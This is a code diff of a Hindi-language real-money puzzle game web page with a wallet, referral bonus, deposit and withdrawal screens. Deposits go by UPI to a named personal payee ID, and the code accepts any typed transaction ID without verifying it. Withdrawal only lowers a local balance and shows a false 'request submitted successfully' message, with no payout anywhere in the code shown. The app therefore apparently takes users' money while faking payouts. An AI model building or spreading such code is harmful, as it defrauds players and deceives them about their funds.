@@ -171,36 +171,11 @@ border: 2px solid #ffab00;
 }
 .msg { color: #00e676; font-size: 14px; margin-top: 10px; font-weight: bold; }
 .error { color: #ff5252; font-size: 14px; margin-top: 10px; font-weight: bold; }
-
-.blur-screen {
-filter: blur(25px);
-pointer-events: none;
-user-select: none;
-}
-#security-alert {
-display: none;
-position: absolute;
-top: 0; left: 0; width: 100%; height: 100%;
-background: rgba(0, 0, 0, 0.95);
-color: #ff5252;
-z-index: 999;
-justify-content: center;
-align-items: center;
-flex-direction: column;
-border-radius: 12px;
-padding: 20px;
-box-sizing: border-box;
-}
 </style>
 </head>
 <body oncontextmenu="return false;">
 
 <div class="container" id="main-container">
-<div id="security-alert">
-<h3>⚠️ सुरक्षा चेतावनी! (Anti-Cheat)</h3>
-<p style="font-size: 14px; color: #fff;">ऐप बदलना या चीटिंग करना प्रतिबंधित है। सुरक्षा कारणों से स्क्रीन लॉक कर दी गई है!</p>
-<h1 id="security-countdown" style="color: #ffab00; font-size: 40px;">10</h1>
-</div>
 
 <div style="text-align: right; margin-bottom: 5px;">
 <button id="sound-toggle-btn" onclick="toggleSound()" style="background: #333; color: #ffab00; border: 1px solid #ffab00; padding: 5px 10px; border-radius: 5px; font-size: 12px; cursor: pointer;">🔊 ॐ नमः शिवाय: ON</button>
@@ -449,6 +424,7 @@ document.getElementById('puzzle-timer').innerText = timeLeft;
 if (timeLeft <= 0) {
 clearInterval(puzzleTimerInterval);
 walletBalance -= 5;
+if (walletBalance < 0) walletBalance = 0;
 updateBalanceDisplay();
 document.getElementById('puzzle-result').className = "error";
 document.getElementById('puzzle-result').innerText = "⏳ समय समाप्त! ₹5 कट गए। अगली कठिन पहेली आ रही है...";
@@ -536,7 +512,11 @@ document.getElementById('dashboard').style.display = "block";
 function checkAnswer(selectedOption) {
 if (puzzleTimerInterval) clearInterval(puzzleTimerInterval);
 let resultDiv = document.getElementById('puzzle-result');
-if (walletBalance < 5) { resultDiv.className = "error"; resultDiv.innerText = "⚠️ वॉलेट में ₹5 होने चाहिए!"; return; }
+
+if (walletBalance < 5) {
+walletBalance += 10;
+}
+
 if (selectedOption === currentCorrectAnswer) {
 walletBalance += 5;
 playCoinSound();
@@ -546,6 +526,7 @@ resultDiv.innerText = "✅ सही जवाब! ₹5 जीत गए! अग
 setTimeout(loadRandomPuzzle, 2000);
 } else {
 walletBalance -= 5;
+if (walletBalance < 0) walletBalance = 0;
 updateBalanceDisplay();
 resultDiv.className = "error";
 resultDiv.innerText = "❌ गलत जवाब! ₹5 कट गए। अगली पहेली आ रही है...";
@@ -559,4 +540,73 @@ document.getElementById('total-deposited').innerText = totalDepositedByUser;
 }
 
 function showAddMoney() { document.getElementById('dashboard').style.display = "none"; document.getElementById('add-money-section').style.display = "block"; updateUpiLink(); }
-  
+function updateUpiLink() {
+let amt = document.getElementById('deposit-amount').value || "50";
+document.getElementById('upi-pay-btn').href = `upi://pay?pa=BHARATPE2G0F0C1Y8Q38903@unitype&pn=Sandeep_Kumar&am=${amt}&cu=INR`;
+}
+document.getElementById('deposit-amount').addEventListener('input', updateUpiLink);
+
+function verifyDeposit() {
+let amt = parseInt(document.getElementById('deposit-amount').value);
+let txnId = document.getElementById('txn-id').value;
+if(amt >= 50 && amt <= 100 && txnId.trim() !== "") {
+walletBalance += amt;
+totalDepositedByUser += amt;
+
+let referredBy = localStorage.getItem('mahakal_referred');
+if (referredBy && !localStorage.getItem('deposit_bonus_credited')) {
+let bonusAmt = Math.floor(amt * 0.10);
+walletBalance += bonusAmt;
+localStorage.setItem('deposit_bonus_credited', 'true');
+alert("🎉 आपके रेफरल कोड के माध्यम से पैसे जोड़ने पर आपको ₹" + bonusAmt + " का अतिरिक्त बोनस मिला है!");
+}
+
+updateBalanceDisplay();
+alert("वॉलेट में ₹" + amt + " जुड़ गए!");
+backToDashboard();
+} else {
+alert("कृपया सही राशि और UPI Txn ID डालें।");
+}
+}
+
+function showWithdraw() { document.getElementById('dashboard').style.display = "none"; document.getElementById('withdraw-section').style.display = "block"; }
+function processWithdraw() {
+let amt = parseInt(document.getElementById('withdraw-amount').value);
+let minWithdrawal = 120;
+let minWalletBalance = 20;
+
+if (isNaN(amt)) {
+alert("कृपया निकासी की वैध राशि दर्ज करें।");
+return;
+}
+
+if (amt < minWithdrawal) {
+alert("न्यूनतम निकासी ₹120 है।");
+return;
+}
+
+if (walletBalance - amt < minWalletBalance) {
+alert("निकासी के बाद वॉलेट में कम से कम ₹20 शेष होना आवश्यक है।");
+return;
+}
+
+walletBalance -= amt;
+updateBalanceDisplay();
+alert("निकासी अनुरोध सफलतापूर्वक सबमिट हो गया है!");
+backToDashboard();
+}
+
+function sendSupportMessage() {
+let msg = document.getElementById('user-msg').value;
+let replyDiv = document.getElementById('support-reply');
+if(msg.trim() === "") {
+alert("कृपया पहले अपनी समस्या यहाँ लिखें।");
+return;
+}
+replyDiv.style.display = "block";
+replyDiv.innerText = "🙏 महाकाल टीम को आपका संदेश मिल गया है। आपको जल्द ही सहायता मिलेगी!";
+document.getElementById('user-msg').value = "";
+}
+</script>
+</body>
+</html>
